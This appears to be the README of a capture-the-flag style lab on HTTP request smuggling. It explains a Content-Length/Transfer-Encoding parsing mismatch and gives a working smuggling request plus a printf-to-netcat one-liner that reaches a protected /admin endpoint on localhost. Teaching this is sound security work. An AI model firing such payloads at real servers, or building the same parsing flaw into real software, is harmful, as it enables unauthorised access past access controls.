# 🔥 Z-Vuln-Lab — HTTP Request Smuggling Challenge

This lab demonstrates a real-world **HTTP Request Smuggling** vulnerability caused by inconsistent request parsing between frontend and backend servers.

Participants must exploit this parsing mismatch to smuggle a hidden request and access a protected admin endpoint.

---

## 🧠 Vulnerability Overview

**HTTP Request Smuggling** occurs when:

- A frontend server parses requests using **Content-Length**, and
- A backend server parses requests using **Transfer-Encoding: chunked**,

allowing attackers to craft a single request that is interpreted as **two separate requests** by different servers.

This lab simulates that behavior in a single backend server to make the vulnerability easy to study and exploit.

---

## 🎯 Objective

Gain access to the protected endpoint:

GET /admin

by smuggling it through a seemingly harmless request to:

POST /submit

### The backend:

1. Accepts **both** `Content-Length` and `Transfer-Encoding` headers.
2. Prioritizes **Transfer-Encoding: chunked**.
3. **Fails to discard leftover bytes** after chunked decoding.
4. Treats leftover bytes as a **new HTTP request**.

This allows attackers to smuggle a second request inside the body of the first.

## 🧪 Vulnerable Request Example

```http
POST /submit HTTP/1.1
Host: test
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: test
X-Admin: true

```
# 💥 Exploitation
```
printf 'POST /submit HTTP/1.1\r\nHost: test\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: test\r\nX-Admin: true\r\n\r\n' | nc 127.0.0.1 8000
```
```
python3 exp.py
```
